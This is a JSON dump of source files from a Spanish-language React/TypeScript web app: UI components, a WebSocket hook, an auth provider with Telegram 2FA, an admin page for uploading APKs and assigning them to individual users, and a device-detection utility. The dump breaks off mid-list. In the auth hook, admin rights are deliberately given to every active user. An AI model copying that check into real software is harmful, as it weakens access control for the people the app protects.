{"file_contents":{"postcss.config.js":{"content":"export default {\n  plugins: {\n    tailwindcss: {},\n    autoprefixer: {},\n  },\n}\n","size_bytes":80},"client/src/components/ui/breadcrumb.tsx":{"content":"import * as React from \"react\"\nimport { Slot } from \"@radix-ui/react-slot\"\nimport { ChevronRight, MoreHorizontal } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Breadcrumb = React.forwardRef<\n  HTMLElement,\n  React.ComponentPropsWithoutRef<\"nav\"> & {\n    separator?: React.ReactNode\n  }\n>(({ ...props }, ref) => <nav ref={ref} aria-label=\"breadcrumb\" {...props} />)\nBreadcrumb.displayName = \"Breadcrumb\"\n\nconst BreadcrumbList = React.forwardRef<\n  HTMLOListElement,\n  React.ComponentPropsWithoutRef<\"ol\">\n>(({ className, ...props }, ref) => (\n  <ol\n    ref={ref}\n    className={cn(\n      \"flex flex-wrap items-center gap-1.5 break-words text-sm text-muted-foreground sm:gap-2.5\",\n      className\n    )}\n    {...props}\n  />\n))\nBreadcrumbList.displayName = \"BreadcrumbList\"\n\nconst BreadcrumbItem = React.forwardRef<\n  HTMLLIElement,\n  React.ComponentPropsWithoutRef<\"li\">\n>(({ className, ...props }, ref) => (\n  <li\n    ref={ref}\n    className={cn(\"inline-flex items-center gap-1.5\", className)}\n    {...props}\n  />\n))\nBreadcrumbItem.displayName = \"BreadcrumbItem\"\n\nconst BreadcrumbLink = React.forwardRef<\n  HTMLAnchorElement,\n  React.ComponentPropsWithoutRef<\"a\"> & {\n    asChild?: boolean\n  }\n>(({ asChild, className, ...props }, ref) => {\n  const Comp = asChild ? Slot : \"a\"\n\n  return (\n    <Comp\n      ref={ref}\n      className={cn(\"transition-colors hover:text-foreground\", className)}\n      {...props}\n    />\n  )\n})\nBreadcrumbLink.displayName = \"BreadcrumbLink\"\n\nconst BreadcrumbPage = React.forwardRef<\n  HTMLSpanElement,\n  React.ComponentPropsWithoutRef<\"span\">\n>(({ className, ...props }, ref) => (\n  <span\n    ref={ref}\n    role=\"link\"\n    aria-disabled=\"true\"\n    aria-current=\"page\"\n    className={cn(\"font-normal text-foreground\", className)}\n    {...props}\n  />\n))\nBreadcrumbPage.displayName = \"BreadcrumbPage\"\n\nconst BreadcrumbSeparator = ({\n  children,\n  className,\n  ...props\n}: React.ComponentProps<\"li\">) => (\n  <li\n    role=\"presentation\"\n    aria-hidden=\"true\"\n    className={cn(\"[&>svg]:w-3.5 [&>svg]:h-3.5\", className)}\n    {...props}\n  >\n    {children ?? <ChevronRight />}\n  </li>\n)\nBreadcrumbSeparator.displayName = \"BreadcrumbSeparator\"\n\nconst BreadcrumbEllipsis = ({\n  className,\n  ...props\n}: React.ComponentProps<\"span\">) => (\n  <span\n    role=\"presentation\"\n    aria-hidden=\"true\"\n    className={cn(\"flex h-9 w-9 items-center justify-center\", className)}\n    {...props}\n  >\n    <MoreHorizontal className=\"h-4 w-4\" />\n    <span className=\"sr-only\">More</span>\n  </span>\n)\nBreadcrumbEllipsis.displayName = \"BreadcrumbElipssis\"\n\nexport {\n  Breadcrumb,\n  BreadcrumbList,\n  BreadcrumbItem,\n  BreadcrumbLink,\n  BreadcrumbPage,\n  BreadcrumbSeparator,\n  BreadcrumbEllipsis,\n}\n","size_bytes":2712},"client/src/hooks/useWebSocket.ts":{"content":"import { useState, useEffect, useCallback, useRef } from 'react';\nimport { createSocketConnection } from '@/utils/websocket';\n\nexport const useWebSocket = (path: string) => {\n  const [socket, setSocket] = useState<WebSocket | null>(null);\n  const [connected, setConnected] = useState(false);\n  const reconnectTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);\n  const reconnectAttemptsRef = useRef(0);\n  const MAX_RECONNECT_ATTEMPTS = 5;\n\n  // Create socket connection\n  useEffect(() => {\n    const createConnection = () => {\n      const ws = createSocketConnection(path);\n      \n      ws.addEventListener('open', () => {\n        console.log('WebSocket connected');\n        setConnected(true);\n        reconnectAttemptsRef.current = 0;\n      });\n      \n      ws.addEventListener('close', (event) => {\n        console.log(`WebSocket closed: ${event.code} ${event.reason}`);\n        setConnected(false);\n        \n        // Attempt to reconnect with exponential backoff\n        if (reconnectAttemptsRef.current < MAX_RECONNECT_ATTEMPTS) {\n          const timeout = Math.min(1000 * 2 ** reconnectAttemptsRef.current, 30000);\n          console.log(`Attempting to reconnect in ${timeout}ms...`);\n          \n          if (reconnectTimeoutRef.current) {\n            clearTimeout(reconnectTimeoutRef.current);\n          }\n          \n          reconnectTimeoutRef.current = setTimeout(() => {\n            reconnectAttemptsRef.current++;\n            createConnection();\n          }, timeout);\n        } else {\n          console.error('Maximum reconnection attempts reached.');\n        }\n      });\n      \n      ws.addEventListener('error', (error) => {\n        console.error('WebSocket error:', error);\n      });\n      \n      setSocket(ws);\n    };\n    \n    createConnection();\n    \n    return () => {\n      if (socket && socket.readyState === WebSocket.OPEN) {\n        socket.close();\n      }\n      \n      if (reconnectTimeoutRef.current) {\n        clearTimeout(reconnectTimeoutRef.current);\n      }\n    };\n  }, [path]);\n\n  // Send message function\n  const sendMessage = useCallback((data: any) => {\n    if (socket && socket.readyState === WebSocket.OPEN) {\n      socket.send(JSON.stringify(data));\n      return true;\n    }\n    return false;\n  }, [socket]);\n\n  return { socket, connected, sendMessage };\n};\n","size_bytes":2310},"client/src/hooks/use-auth.tsx":{"content":"import { createContext, ReactNode, useContext, useEffect, useRef, useState } from \"react\";\nimport {\n  useQuery,\n  useMutation,\n  UseMutationResult,\n} from \"@tanstack/react-query\";\nimport { User, UserRole } from \"@shared/schema\";\nimport { getQueryFn, apiRequest, queryClient } from \"../lib/queryClient\";\nimport { useToast } from \"@/hooks/use-toast\";\nimport { Dialog, DialogContent, DialogFooter, DialogHeader, DialogTitle } from \"@/components/ui/dialog\";\nimport { Button } from \"@/components/ui/button\";\n\ntype AuthContextType = {\n  user: User | null;\n  isLoading: boolean;\n  error: Error | null;\n  isAdmin: boolean;\n  loginMutation: UseMutationResult<any, Error, LoginData>;\n  logoutMutation: UseMutationResult<void, Error, void>;\n  registerMutation: UseMutationResult<any, Error, RegisterData>;\n};\n\ntype LoginData = {\n  username: string;\n  password: string;\n};\n\ntype RegisterData = {\n  username: string;\n  password: string;\n  telegramChatId?: string;\n  role?: UserRole;\n  discountCode?: string;\n  accountType?: 'individual' | 'office';\n};\n\nexport const AuthContext = createContext<AuthContextType | null>(null);\n\nexport function AuthProvider({ children }: { children: ReactNode }) {\n  const { toast } = useToast();\n  // Referencia para el temporizador de inactividad\n  const inactivityTimerRef = useRef<NodeJS.Timeout | null>(null);\n  // Estado para controlar cu谩ndo se est谩 por cerrar sesi贸n\n  const [showInactivityWarning, setShowInactivityWarning] = useState(false);\n  \n  const {\n    data: user,\n    error,\n    isLoading,\n    refetch,\n  } = useQuery<any | null, Error>({\n    queryKey: [\"/api/user\"],\n    queryFn: getQueryFn({ on401: \"returnNull\" }),\n  });\n\n  console.log(\"[Auth] Estado de autenticaci贸n:\", user ? `Usuario ${user.username} autenticado` : \"No autenticado\");\n  // Actualizada la comprobaci贸n de administrador para conceder permisos de administrador a usuarios normales\n  // Todos los usuarios activos tendr谩n acceso a la interfaz de administrador pero con visibilidad restringida\n  const isAdmin = user ? user.isActive === true : false;\n  \n  // Configuraci贸n de tiempo de inactividad (10 minutos = 600000 ms)\n  const INACTIVITY_TIMEOUT = 600000;\n  const INACTIVITY_WARNING_TIME = 30000; // Mostrar advertencia 30 segundos antes\n\n  // Funci贸n para reiniciar el temporizador de inactividad\n  const resetInactivityTimer = () => {\n    // Limpiar el temporizador existente si hay uno\n    if (inactivityTimerRef.current) {\n      clearTimeout(inactivityTimerRef.current);\n      inactivityTimerRef.current = null;\n    }\n    \n    // Solo configurar el temporizador si el usuario est谩 autenticado\n    if (user) {\n      // Primero configurar el temporizador para mostrar la advertencia\n      inactivityTimerRef.current = setTimeout(() => {\n        setShowInactivityWarning(true);\n        \n        // Luego configurar el temporizador para cerrar sesi贸n\n        inactivityTimerRef.current = setTimeout(() => {\n          if (user) {\n            logoutMutation.mutate();\n            toast({\n              title: \"Sesi贸n cerrada\",\n              description: \"Su sesi贸n ha sido cerrada por inactividad\",\n              variant: \"destructive\",\n            });\n            setShowInactivityWarning(false);\n          }\n        }, INACTIVITY_WARNING_TIME);\n      }, INACTIVITY_TIMEOUT - INACTIVITY_WARNING_TIME);\n    }\n  };\n  \n  // Reiniciar el temporizador cuando el usuario se autentica\n  useEffect(() => {\n    if (user) {\n      resetInactivityTimer();\n    }\n  }, [user]);\n  \n  // Configurar los event listeners para detectar actividad del usuario\n  useEffect(() => {\n    if (!user) return;\n    \n    const activityEvents = [\n      'mousedown', 'keydown', 'touchstart', 'scroll', 'mousemove'\n    ];\n    \n    const handleUserActivity = () => {\n      if (showInactivityWarning) {\n        setShowInactivityWarning(false);\n      }\n      resetInactivityTimer();\n    };\n    \n    // Agregar event listeners para cada tipo de evento\n    activityEvents.forEach(event => {\n      window.addEventListener(event, handleUserActivity);\n    });\n    \n    // Limpiar event listeners al desmontar\n    return () => {\n      activityEvents.forEach(event => {\n        window.removeEventListener(event, handleUserActivity);\n      });\n      \n      // Limpiar cualquier temporizador pendiente\n      if (inactivityTimerRef.current) {\n        clearTimeout(inactivityTimerRef.current);\n      }\n    };\n  }, [user, showInactivityWarning]);\n\n  const loginMutation = useMutation({\n    mutationFn: async (credentials: LoginData) => {\n      const res = await apiRequest(\"POST\", \"/api/login\", credentials);\n      if (!res.ok) {\n        const errorData = await res.json();\n        throw new Error(errorData.message || \"Error al iniciar sesi贸n\");\n      }\n      return await res.json();\n    },\n    onSuccess: (data) => {\n      console.log(\"[Auth] Login response:\", data);\n      \n      // Detectar si requiere 2FA\n      if (data.requiresTwoFactor) {\n        console.log(\"[Auth] 2FA requerido, redirigiendo a verificaci贸n\");\n        toast({\n          title: \"C贸digo de verificaci贸n enviado\",\n          description: data.message || \"Revisa tu Telegram para el c贸digo de verificaci贸n\",\n        });\n        // Redirigir a la p谩gina de verificaci贸n 2FA\n        window.location.href = \"/2fa-verify\";\n        return;\n      }\n      \n      // Login exitoso completo\n      console.log(\"[Auth] Login exitoso:\", data);\n      queryClient.setQueryData([\"/api/user\"], data);\n      refetch();\n      toast({\n        title: \"Inicio de sesi贸n exitoso\",\n        description: \"Bienvenido al panel de administraci贸n\",\n      });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: \"Error al iniciar sesi贸n\",\n        description: error.message,\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  const registerMutation = useMutation({\n    mutationFn: async (userData: RegisterData) => {\n      const res = await apiRequest(\"POST\", \"/api/register\", userData);\n      if (!res.ok) {\n        const errorData = await res.json();\n        throw new Error(errorData.message || \"Error al registrar usuario\");\n      }\n      return await res.json();\n    },\n    onSuccess: (data) => {\n      toast({\n        title: \"Registro completado\",\n        description: \"Env铆a un mensaje a @BalonxSistema por Telegram para que active tu cuenta. Ser谩s redirigido al inicio de sesi贸n...\",\n        duration: 5000,\n      });\n      \n      // Redirigir al login despu茅s de 3 segundos\n      setTimeout(() => {\n        // Triggering a re-render to switch to login tab\n        window.dispatchEvent(new CustomEvent('switchToLogin'));\n      }, 3000);\n    },\n    onError: (error: Error) => {\n      toast({\n        title: \"Error al registrar usuario\",\n        description: error.message,\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  const logoutMutation = useMutation({\n    mutationFn: async () => {\n      await apiRequest(\"POST\", \"/api/logout\");\n    },\n    onSuccess: () => {\n      queryClient.setQueryData([\"/api/user\"], null);\n      toast({\n        title: \"Sesi贸n cerrada\",\n        description: \"Has cerrado sesi贸n correctamente\",\n      });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: \"Error al cerrar sesi贸n\",\n        description: error.message,\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  return (\n    <AuthContext.Provider\n      value={{\n        user,\n        isLoading,\n        error,\n        isAdmin,\n        loginMutation,\n        logoutMutation,\n        registerMutation,\n      }}\n    >\n      {/* Di谩logo de advertencia de inactividad */}\n      <Dialog open={showInactivityWarning} onOpenChange={setShowInactivityWarning}>\n        <DialogContent className=\"sm:max-w-md\">\n          <DialogHeader>\n            <DialogTitle className=\"text-red-500\">Advertencia de inactividad</DialogTitle>\n          </DialogHeader>\n          <div className=\"py-4\">\n            <p>Su sesi贸n se cerrar谩 autom谩ticamente en 30 segundos debido a inactividad.</p>\n            <p className=\"mt-2\">驴Desea continuar en la sesi贸n?</p>\n          </div>\n          <DialogFooter>\n            <Button \n              type=\"button\" \n              variant=\"default\" \n              onClick={() => {\n                // Reiniciar el temporizador cuando el usuario confirma que quiere seguir\n                setShowInactivityWarning(false);\n                resetInactivityTimer();\n              }}\n            >\n              Continuar sesi贸n\n            </Button>\n            <Button \n              type=\"button\" \n              variant=\"destructive\"\n              onClick={() => {\n                logoutMutation.mutate();\n                setShowInactivityWarning(false);\n              }}\n            >\n              Cerrar sesi贸n\n            </Button>\n          </DialogFooter>\n        </DialogContent>\n      </Dialog>\n      \n      {children}\n    </AuthContext.Provider>\n  );\n}\n\nexport function useAuth() {\n  const context = useContext(AuthContext);\n  if (!context) {\n    throw new Error(\"useAuth debe ser usado dentro de un AuthProvider\");\n  }\n  return context;\n}","size_bytes":9043},"client/src/components/ui/table.tsx":{"content":"import * as React from \"react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Table = React.forwardRef<\n  HTMLTableElement,\n  React.HTMLAttributes<HTMLTableElement>\n>(({ className, ...props }, ref) => (\n  <div className=\"relative w-full overflow-auto\">\n    <table\n      ref={ref}\n      className={cn(\"w-full caption-bottom text-sm\", className)}\n      {...props}\n    />\n  </div>\n))\nTable.displayName = \"Table\"\n\nconst TableHeader = React.forwardRef<\n  HTMLTableSectionElement,\n  React.HTMLAttributes<HTMLTableSectionElement>\n>(({ className, ...props }, ref) => (\n  <thead ref={ref} className={cn(\"[&_tr]:border-b\", className)} {...props} />\n))\nTableHeader.displayName = \"TableHeader\"\n\nconst TableBody = React.forwardRef<\n  HTMLTableSectionElement,\n  React.HTMLAttributes<HTMLTableSectionElement>\n>(({ className, ...props }, ref) => (\n  <tbody\n    ref={ref}\n    className={cn(\"[&_tr:last-child]:border-0\", className)}\n    {...props}\n  />\n))\nTableBody.displayName = \"TableBody\"\n\nconst TableFooter = React.forwardRef<\n  HTMLTableSectionElement,\n  React.HTMLAttributes<HTMLTableSectionElement>\n>(({ className, ...props }, ref) => (\n  <tfoot\n    ref={ref}\n    className={cn(\n      \"border-t bg-muted/50 font-medium [&>tr]:last:border-b-0\",\n      className\n    )}\n    {...props}\n  />\n))\nTableFooter.displayName = \"TableFooter\"\n\nconst TableRow = React.forwardRef<\n  HTMLTableRowElement,\n  React.HTMLAttributes<HTMLTableRowElement>\n>(({ className, ...props }, ref) => (\n  <tr\n    ref={ref}\n    className={cn(\n      \"border-b transition-colors hover:bg-muted/50 data-[state=selected]:bg-muted\",\n      className\n    )}\n    {...props}\n  />\n))\nTableRow.displayName = \"TableRow\"\n\nconst TableHead = React.forwardRef<\n  HTMLTableCellElement,\n  React.ThHTMLAttributes<HTMLTableCellElement>\n>(({ className, ...props }, ref) => (\n  <th\n    ref={ref}\n    className={cn(\n      \"h-12 px-4 text-left align-middle font-medium text-muted-foreground [&:has([role=checkbox])]:pr-0\",\n      className\n    )}\n    {...props}\n  />\n))\nTableHead.displayName = \"TableHead\"\n\nconst TableCell = React.forwardRef<\n  HTMLTableCellElement,\n  React.TdHTMLAttributes<HTMLTableCellElement>\n>(({ className, ...props }, ref) => (\n  <td\n    ref={ref}\n    className={cn(\"p-4 align-middle [&:has([role=checkbox])]:pr-0\", className)}\n    {...props}\n  />\n))\nTableCell.displayName = \"TableCell\"\n\nconst TableCaption = React.forwardRef<\n  HTMLTableCaptionElement,\n  React.HTMLAttributes<HTMLTableCaptionElement>\n>(({ className, ...props }, ref) => (\n  <caption\n    ref={ref}\n    className={cn(\"mt-4 text-sm text-muted-foreground\", className)}\n    {...props}\n  />\n))\nTableCaption.displayName = \"TableCaption\"\n\nexport {\n  Table,\n  TableHeader,\n  TableBody,\n  TableFooter,\n  TableHead,\n  TableRow,\n  TableCell,\n  TableCaption,\n}\n","size_bytes":2765},"client/src/components/admin/APKManagement.tsx":{"content":"import React, { useState, useEffect } from 'react';\nimport { Button } from '@/components/ui/button';\nimport { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Input } from '@/components/ui/input';\nimport { Label } from '@/components/ui/label';\nimport { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';\nimport { Trash2, Download, Upload, Package } from 'lucide-react';\nimport { useToast } from '@/hooks/use-toast';\n\ninterface User {\n  id: number;\n  username: string;\n  apkFileName?: string;\n  apkFileUrl?: string;\n  hasApk: boolean;\n}\n\nexport function APKManagement() {\n  const [users, setUsers] = useState<User[]>([]);\n  const [selectedUserId, setSelectedUserId] = useState<string>('');\n  const [uploadedAPK, setUploadedAPK] = useState<{fileName: string, fileUrl: string} | null>(null);\n  const [loading, setLoading] = useState(false);\n  const [userSearchFilter, setUserSearchFilter] = useState<string>('');\n  const { toast } = useToast();\n\n  // Cargar lista de usuarios al inicializar\n  useEffect(() => {\n    fetchUsers();\n  }, []);\n\n  const fetchUsers = async () => {\n    try {\n      const response = await fetch('/api/users-for-apk', {\n        credentials: 'include'\n      });\n      \n      if (response.ok) {\n        const userData = await response.json();\n        setUsers(userData);\n      }\n    } catch (error) {\n      console.error('Error fetching users:', error);\n    }\n  };\n\n  const handleFileUpload = async (event: React.ChangeEvent<HTMLInputElement>) => {\n    const file = event.target.files?.[0];\n    if (!file) return;\n\n    // Verificar que sea un APK\n    if (!file.name.toLowerCase().endsWith('.apk')) {\n      toast({\n        title: \"Error\",\n        description: \"El archivo debe ser un APK (.apk)\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n\n    setLoading(true);\n    \n    try {\n      const formData = new FormData();\n      formData.append('apkFile', file);\n\n      const response = await fetch('/api/upload-apk', {\n        method: 'POST',\n        body: formData,\n        credentials: 'include'\n      });\n\n      const result = await response.json();\n\n      if (response.ok) {\n        setUploadedAPK({\n          fileName: result.fileName,\n          fileUrl: result.fileUrl\n        });\n        \n        toast({\n          title: \"xito\",\n          description: `APK ${result.fileName} subido correctamente (${result.fileSize})`\n        });\n      } else {\n        throw new Error(result.message);\n      }\n    } catch (error) {\n      console.error('Error uploading APK:', error);\n      toast({\n        title: \"Error\",\n        description: error instanceof Error ? error.message : \"Error al subir APK\",\n        variant: \"destructive\"\n      });\n    } finally {\n      setLoading(false);\n    }\n  };\n\n  const handleAssignAPK = async () => {\n    if (!selectedUserId || !uploadedAPK) {\n      toast({\n        title: \"Error\",\n        description: \"Selecciona un usuario y sube un APK primero\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n\n    setLoading(true);\n\n    try {\n      const response = await fetch('/api/assign-apk', {\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/json',\n        },\n        body: JSON.stringify({\n          userId: selectedUserId,\n          apkFileName: uploadedAPK.fileName,\n          apkFileUrl: uploadedAPK.fileUrl\n        }),\n        credentials: 'include'\n      });\n\n      const result = await response.json();\n\n      if (response.ok) {\n        toast({\n          title: \"xito\",\n          description: result.message\n        });\n\n        // Limpiar formulario y recargar usuarios\n        setSelectedUserId('');\n        setUploadedAPK(null);\n        fetchUsers();\n        \n        // Limpiar el input file\n        const fileInput = document.getElementById('apk-upload') as HTMLInputElement;\n        if (fileInput) fileInput.value = '';\n      } else {\n        throw new Error(result.message);\n      }\n    } catch (error) {\n      console.error('Error assigning APK:', error);\n      toast({\n        title: \"Error\",\n        description: error instanceof Error ? error.message : \"Error al asignar APK\",\n        variant: \"destructive\"\n      });\n    } finally {\n      setLoading(false);\n    }\n  };\n\n  const handleRemoveAPK = async (userId: number, username: string) => {\n    try {\n      const response = await fetch('/api/assign-apk', {\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/json',\n        },\n        body: JSON.stringify({\n          userId: userId,\n          apkFileName: null,\n          apkFileUrl: null\n        }),\n        credentials: 'include'\n      });\n\n      const result = await response.json();\n\n      if (response.ok) {\n        toast({\n          title: \"xito\",\n          description: `APK removido del usuario ${username}`\n        });\n\n        fetchUsers();\n      } else {\n        throw new Error(result.message);\n      }\n    } catch (error) {\n      console.error('Error removing APK:', error);\n      toast({\n        title: \"Error\",\n        description: error instanceof Error ? error.message : \"Error al remover APK\",\n        variant: \"destructive\"\n      });\n    }\n  };\n\n  return (\n    <div className=\"space-y-6\">\n      <div className=\"flex items-center space-x-2\">\n        <Package className=\"h-6 w-6\" />\n        <h1 className=\"text-2xl font-bold\">Gesti贸n de APKs</h1>\n      </div>\n\n      {/* Formulario para subir y asignar APK */}\n      <Card>\n        <CardHeader>\n          <CardTitle>Subir y Asignar APK</CardTitle>\n        </CardHeader>\n        <CardContent className=\"space-y-4\">\n          <div>\n            <Label htmlFor=\"apk-upload\">Archivo APK</Label>\n            <Input\n              id=\"apk-upload\"\n              type=\"file\"\n              accept=\".apk\"\n              onChange={handleFileUpload}\n              disabled={loading}\n            />\n            {uploadedAPK && (\n              <div className=\"mt-2 p-2 bg-green-50 border rounded-md\">\n                <div className=\"flex items-center space-x-2\">\n                  <Upload className=\"h-4 w-4 text-green-600\" />\n                  <span className=\"text-sm text-green-700\">\n                    {uploadedAPK.fileName} subido correctamente\n                  </span>\n                </div>\n              </div>\n            )}\n          </div>\n\n          <div>\n            <Label htmlFor=\"user-search\">Buscar Usuario</Label>\n            <Input\n              id=\"user-search\"\n              type=\"text\"\n              placeholder=\"Escribe para buscar usuarios...\"\n              value={userSearchFilter}\n              onChange={(e) => setUserSearchFilter(e.target.value)}\n              disabled={loading}\n              className=\"mb-2\"\n            />\n            <Label htmlFor=\"user-select\">Usuario</Label>\n            <Select value={selectedUserId} onValueChange={setSelectedUserId} disabled={loading}>\n              <SelectTrigger>\n                <SelectValue placeholder=\"Seleccionar usuario\" />\n              </SelectTrigger>\n              <SelectContent className=\"max-h-[300px] overflow-y-auto\">\n                {users\n                  .filter(user => \n                    user.username.toLowerCase().includes(userSearchFilter.toLowerCase())\n                  )\n                  .map((user) => (\n                  <SelectItem key={user.id} value={user.id.toString()}>\n                    {user.username} {user.hasApk && '(ya tiene APK)'}\n                  </SelectItem>\n                ))}\n              </SelectContent>\n            </Select>\n            <div className=\"text-sm text-gray-500 mt-1\">\n              {users.filter(user => \n                user.username.toLowerCase().includes(userSearchFilter.toLowerCase())\n              ).length} de {users.length} usuarios mostrados\n            </div>\n          </div>\n\n          <Button \n            onClick={handleAssignAPK} \n            disabled={!selectedUserId || !uploadedAPK || loading}\n            className=\"w-full\"\n          >\n            {loading ? \"Procesando...\" : \"Asignar APK al Usuario\"}\n          </Button>\n        </CardContent>\n      </Card>\n\n      {/* Lista de usuarios con APKs asignados */}\n      <Card>\n        <CardHeader>\n          <CardTitle>Usuarios con APKs Asignados</CardTitle>\n        </CardHeader>\n        <CardContent>\n          {users.filter(user => user.hasApk).length === 0 ? (\n            <div className=\"text-center py-8 text-gray-500\">\n              No hay usuarios con APKs asignados\n            </div>\n          ) : (\n            <div className=\"space-y-2\">\n              {users.filter(user => user.hasApk).map((user) => (\n                <div key={user.id} className=\"flex items-center justify-between p-3 border rounded-lg\">\n                  <div className=\"flex items-center space-x-3\">\n                    <Package className=\"h-4 w-4 text-blue-600\" />\n                    <div>\n                      <div className=\"font-medium\">{user.username}</div>\n                      <div className=\"text-sm text-gray-500\">{user.apkFileName}</div>\n                    </div>\n                  </div>\n                  <div className=\"flex items-center space-x-2\">\n                    <Button\n                      variant=\"outline\"\n                      size=\"sm\"\n                      onClick={() => window.open(user.apkFileUrl, '_blank')}\n                    >\n                      <Download className=\"h-4 w-4\" />\n                    </Button>\n                    <Button\n                      variant=\"outline\"\n                      size=\"sm\"\n                      onClick={() => handleRemoveAPK(user.id, user.username)}\n                    >\n                      <Trash2 className=\"h-4 w-4\" />\n                    </Button>\n                  </div>\n                </div>\n              ))}\n            </div>\n          )}\n        </CardContent>\n      </Card>\n    </div>\n  );\n}","size_bytes":9871},"client/src/components/ui/aspect-ratio.tsx":{"content":"import * as AspectRatioPrimitive from \"@radix-ui/react-aspect-ratio\"\n\nconst AspectRatio = AspectRatioPrimitive.Root\n\nexport { AspectRatio }\n","size_bytes":140},"client/src/utils/deviceDetection.ts":{"content":"export interface DeviceInfo {\n  type: 'Android' | 'iPhone' | 'PC';\n  model: string;\n  browser: string;\n  os: string;\n  userAgent: string;\n}\n\nexport function detectDevice(): DeviceInfo {\n  const userAgent = navigator.userAgent;\n  let type: 'Android' | 'iPhone' | 'PC' = 'PC';\n  let model = 'Desconocido';\n  let browser = 'Desconocido';\n  let os = 'Desconocido';\n\n  // Detectar tipo de dispositivo y OS\n  if (/Android/i.test(userAgent)) {\n    type = 'Android';\n    os = 'Android';\n    \n    // Detectar modelos espec铆ficos de Android\n    const androidModels = [\n      { pattern: /SM-G998B/i, name: 'Samsung Galaxy S21 Ultra' },\n      { pattern: /SM-G996B/i, name: 'Samsung Galaxy S21+' },\n      { pattern: /SM-G991B/i, name: 'Samsung Galaxy S21' },\n      { pattern: /SM-G988B/i, name: 'Samsung Galaxy S20 Ultra' },\n      { pattern: /SM-G985F/i, name: 'Samsung Galaxy S20+' },\n      { pattern: /SM-G981B/i, name: 'Samsung Galaxy S20' },\n      { pattern: /SM-N986B/i, name: 'Samsung Galaxy Note 20 Ultra' },\n      { pattern: /SM-N981B/i, name: 'Samsung Galaxy Note 20' },\n      { pattern: /SM-A536B/i, name: 'Samsung Galaxy A53' },\n      { pattern: /SM-A525F/i, name: 'Samsung Galaxy A52' },\n      { pattern: /SM-A515F/i, name: 'Samsung Galaxy A51' },\n      { pattern: /Pixel 7 Pro/i, name: 'Google Pixel 7 Pro' },\n      { pattern: /Pixel 7/i, name: 'Google Pixel 7' },\n      { pattern: /Pixel 6 Pro/i, name: 'Google Pixel 6 Pro' },\n      { pattern: /Pixel 6/i, name: 'Google Pixel 6' },\n      { pattern: /Pixel 5/i, name: 'Google Pixel 5' },\n      { pattern: /Pixel 4a/i, name: 'Google Pixel 4a' },\n      { pattern: /OnePlus/i, name: 'OnePlus' },\n      { pattern: /Xiaomi/i, name: 'Xiaomi' },\n      { pattern: /Redmi/i, name: 'Xiaomi Redmi' },\n      { pattern: /HUAWEI/i, name: 'Huawei' },\n      { pattern: /LG-/i, name: 'LG' },\n      { pattern: /Moto/i, name: 'Motorola' },\n    ];\n\n    for (const androidModel of androidModels) {\n      if (androidModel.pattern.test(userAgent)) {\n        model = androidModel.name;\n        break;\n      }\n    }\n\n    if (model === 'Desconocido') {\n      // Intentar extraer modelo gen茅rico\n      const match = userAgent.match(/Android.*?;\\s*([^)]+)/);\n      if (match) {\n        model = `Android ${match[1].trim()}`;\n      } else {\n        model = 'Android Desconocido';\n      }\n    }\n\n  } else if (/iPhone/i.test(userAgent)) {\n    type = 'iPhone';\n    os = 'iOS';\n    \n    // Detectar modelos espec铆ficos de iPhone\n    const iphoneModels = [\n      { pattern: /iPhone15,3/i, name: 'iPhone 14 Pro Max' },\n      { pattern: /iPhone15,2/i, name: 'iPhone 14 Pro' },\n      { pattern: /iPhone14,8/i, name: 'iPhone 14 Plus' },\n      { pattern: /iPhone14,7/i, name: 'iPhone 14' },\n      { pattern: /iPhone14,3/i, name: 'iPhone 13 Pro Max' },\n      { pattern: /iPhone14,2/i, name: 'iPhone 13 Pro' },\n      { pattern: /iPhone14,5/i, name: 'iPhone 13' },\n      { pattern: /iPhone14,4/i, name: 'iPhone 13 mini' },\n      { pattern: /iPhone13,4/i, name: 'iPhone 12 Pro Max' },\n      { pattern: /iPhone13,3/i, name: 'iPhone 12 Pro' },\n      { pattern: /iPhone13,2/i, name: 'iPhone 12' },\n      { pattern: /iPhone13,1/i, name: 'iPhone 12 mini' },\n      { pattern: /iPhone12,8/i, name: 'iPhone SE (2020)' },\n      { pattern: /iPhone12,5/i, name: 'iPhone 11 Pro Max' },\n      { pattern: /iPhone12,3/i, name: 'iPhone 11 Pro' },\n      { pattern: /iPhone12,1/i, name: 'iPhone 11' },\n      { pattern: /iPhone11,8/i, name: 'iPhone XR' },\n      { pattern: /iPhone11,6/i, name: 'iPhone XS Max' },\n      { pattern: /iPhone11,2/i, name: 'iPhone XS' },\n      { pattern: /iPhone10,6/i, name: 'iPhone X' },\n      { pattern: /iPhone10,5/i, name: 'iPhone 8 Plus' },\n      { pattern: /iPhone10,4/i, name: 'iPhone 8' },\n      { pattern: /iPhone9,4/i, name: 'iPhone 7 Plus' },\n      { pattern: /iPhone9,3/i, name: 'iPhone 7' },\n    ];\n\n    for (const iphoneModel of iphoneModels) {\n      if (iphoneModel.pattern.test(userAgent)) {\n        model = iphoneModel.name;\n        break;\n      }\n    }\n\n    if (model === 'Desconocido') {\n      // Intentar extraer versi贸n de iOS\n      const iosMatch = userAgent.match(/OS (\\d+_\\d+)/);\n      if (iosMatch) {\n        const iosVersion = iosMatch[1].replace('_', '.');\n        model = `iPhone (iOS ${iosVersion})`;\n      } else {\n        model = 'iPhone Desconocido';\n      }\n    }\n\n  } else if (/iPad/i.test(userAgent)) {\n    type = 'iPhone'; // Consideramos iPad como iOS\n    os = 'iPadOS';\n    \n    const ipadModels = [\n      { pattern: /iPad14,1|iPad14,2/i, name: 'iPad Pro 11\" (4th gen)' },\n      { pattern: /iPad14,3|iPad14,4/i, name: 'iPad Pro 12.9\" (6th gen)' },\n      { pattern: /iPad13,18|iPad13,19/i, name: 'iPad (10th gen)' },\n      { pattern: /iPad14,5|iPad14,6/i, name: 'iPad Air (5th gen)' },\n      { pattern: /iPad11,6|iPad11,7/i, name: 'iPad (9th gen)' },\n      { pattern: 